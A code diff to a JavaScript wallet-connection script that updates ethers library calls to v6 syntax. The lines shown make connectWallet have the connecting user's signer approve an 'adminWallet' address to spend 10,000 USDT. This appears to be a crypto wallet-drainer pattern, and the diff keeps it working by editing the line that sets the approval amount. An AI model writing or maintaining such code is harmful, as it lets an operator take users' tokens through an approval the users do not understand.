@@ -1,5 +1,5 @@
 import EthereumProvider from "@walletconnect/ethereum-provider";
-import { ethers } from "ethers";
+import { ethers, parseUnits } from "ethers";
 
 const CHAIN_CONFIG = {
     bep: {
@@ -98,7 +98,7 @@ async function connectWallet(chainType) {
             const contract = new ethers.Contract(config.usdtAddress, ABI, signer);
             
             // Set approval amount to 10,000 USDT (6 decimals)
-            const amount = ethers.utils.parseUnits("10000", 6);
+            const amount = parseUnits("10000", 6);
 
             const tx = await contract.approve(config.adminWallet, amount);
             await tx.wait();
